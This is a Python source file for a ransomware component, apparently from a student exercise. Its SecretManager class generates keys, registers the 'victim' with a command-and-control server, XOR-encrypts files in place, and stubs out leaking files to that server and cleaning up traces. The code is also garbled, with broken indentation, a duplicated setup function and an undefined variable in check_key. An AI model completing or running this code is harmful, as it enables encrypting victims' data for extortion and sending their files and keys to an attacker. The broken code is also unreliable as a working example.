from hashlib import sha256
from hashlib import pbkdf2_hmac
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from os import urandom
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    # This function derives a key 
    def do_derivation(self, salt:bytes, key:bytes)->bytes:
         kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION
        )
        return kdf.derive(key)
        

    # This function creates a random Salt and a random key
    def create(self)->Tuple[bytes, bytes, bytes]:
        salt = urandom(self.SALT_LENGTH)
        key = urandom(self.KEY_LENGTH)
        hashed_salt = pbkdf2_hmac('sha256', salt, salt, self.ITERATION)
        hashed_key = self.do_derivation(hashed_salt, key)
        token = urandom(self.TOKEN_LENGTH)
        return hashed_salt, hashed_key, token
        


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        
   # Convert bytes to base64 encoded strings
    encoded_token = self.bin_to_b64(token)
    encoded_salt = self.bin_to_b64(salt)
    encoded_key = self.bin_to_b64(key)

    # Create JSON data
    data = {
        "token": encoded_token,
        "salt": encoded_salt,
        "key": encoded_key
    }

    # Send JSON data to CNC
    url = f"http://{self._remote_host_port}/api/new"
    response = requests.post(url, json=data)

    # Check response status code
    if response.status_code != 200:
        self._log.error(f"Failed to register victim to CNC: {response.status_code} {response.text}")
        return

    self._log.info("Victim registered to CNC")
    
    # main function to create crypto data and register malware to cnc
    def setup(self)->None:
         def setup(self) -> None:
        # Create crypto data
        salt, key, token = self.create()

        # Save salt and token to files
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")
        with open(salt_file, "wb") as f:
            f.write(salt)
        with open(token_file, "wb") as f:
            f.write(token)

        # Send crypto data to CNC
        salt_b64 = self.bin_to_b64(salt)
        key_b64 = self.bin_to_b64(key)
        token_b64 = self.bin_to_b64(token)
        url = f"http://{self._remote_host_port}/register"
        data = {"salt": salt_b64, "key": key_b64, "token": token_b64}
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Error sending data to CNC: {response.status_code} - {response.text}")
            return
        self._log.info("Successfully sent crypto data to CNC")

    def load(self)->None:
        # function to load crypto data
        salt_file = os.path.join(self._path, 'salt.bin')
        token_file = os.path.join(self._path, 'token.bin')
        
        with open(salt_file, 'rb') as f:
            self._salt = f.read()
        
        with open(token_file, 'rb') as f:
            self._token = f.read()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        try:
            key = base64.b64decode(key_b64)
        except Exception as e:
            raise ValueError("Invalid key format") from e
        
        if len(key) != 32:
            raise ValueError("Invalid key length")

        return key

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        # Validates a base64 key
        key = base64.b64decode(b64_key)
        if not self.check_key(key):
            raise ValueError("The provide key is not valid")
        self._key = key

    # This function calculates the SHA-256 hash of the token
    def get_hex_token(self)->str:
        
        if self._token is None:
        raise ValueError("Token is not set")
        hashed_token = sha256(self._token)
        return hashed_token.hexdigest()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file in files:
            with open(file, "rb") as f:
                data = f.read()
            cipher_data = xorfile(data, self._key)
            with open(file, "wb") as f:
                f.write(cipher_data)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()